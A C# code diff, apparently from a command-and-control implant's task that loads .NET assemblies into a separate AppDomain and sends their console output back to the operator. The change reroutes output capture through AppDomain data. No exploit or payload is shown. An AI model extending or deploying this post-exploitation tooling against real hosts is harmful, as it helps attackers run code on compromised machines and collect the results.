@@ -53,9 +53,7 @@ namespace Tasks
         private readonly Action<object> _sendAction;
 
         private System.Threading.Tasks.Task _sendTask = null;
-
-        private static string _output = "";
-
+        
         private static bool _completed = false;
         
         
@@ -85,19 +83,23 @@ namespace Tasks
                     {
                         Complete
                     }, 1000);
-                    accumOut = _output;
-                    slicedOut = accumOut.Skip(lastOutLen).Aggregate("", (current, s) => current + s);
-                    lastOutLen = accumOut.Length;
-                    if (!string.IsNullOrEmpty(slicedOut))
+                    accumOut = AppDomain.CurrentDomain.GetData("output") as string;
+                    if (!string.IsNullOrEmpty(accumOut))
                     {
-                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                            slicedOut,
-                            false,
-                            ""));
+                        slicedOut = accumOut.Skip(lastOutLen).Aggregate("", (current, s) => current + s);
+                        lastOutLen = accumOut.Length;
+                        if (!string.IsNullOrEmpty(slicedOut))
+                        {
+                            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                                slicedOut,
+                                false,
+                                ""));
+                        }
                     }
                 }
-                
-                slicedOut = _output.Skip(lastOutLen).Aggregate("", (current, s)=> current + s);
+
+                string finalOut = AppDomain.CurrentDomain.GetData("output") as string;
+                slicedOut = finalOut.Skip(lastOutLen).Aggregate("", (current, s)=> current + s);
                 if (!string.IsNullOrEmpty(slicedOut))
                 {
                     _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
@@ -206,7 +208,7 @@ namespace Tasks
                     }
 
                     _completed = false;
-                    _output = "";
+                    AppDomain.CurrentDomain.SetData("output", "");
                     _agent.ReleaseOutputLock();
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(resp);
@@ -282,17 +284,19 @@ namespace Tasks
 #region Cross AppDomain Loader
         static void ActivateLoader()
         {
+            string output = "";
             string[] str = AppDomain.CurrentDomain.GetData("str") as string[];
-            // EventableStringWriter stdoutWriter = new EventableStringWriter();
-            // stdoutWriter.BufferWritten += (sender, args) =>
-            // {
-            //     if (!string.IsNullOrEmpty(args.Data))
-            //     {
-            //         _output += args.Data;
-            //     }
-            // };
-            // Console.SetOut(stdoutWriter);
-            // Console.SetError(stdoutWriter);
+            EventableStringWriter stdoutWriter = new EventableStringWriter();
+            stdoutWriter.BufferWritten += (sender, args) =>
+            {
+                if (!string.IsNullOrEmpty(args.Data))
+                {
+                    output += args.Data;
+                    AppDomain.CurrentDomain.SetData("output", output);
+                }
+            };
+            Console.SetOut(stdoutWriter);
+            Console.SetError(stdoutWriter);
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
                 if (!asm.FullName.Contains("mscor"))
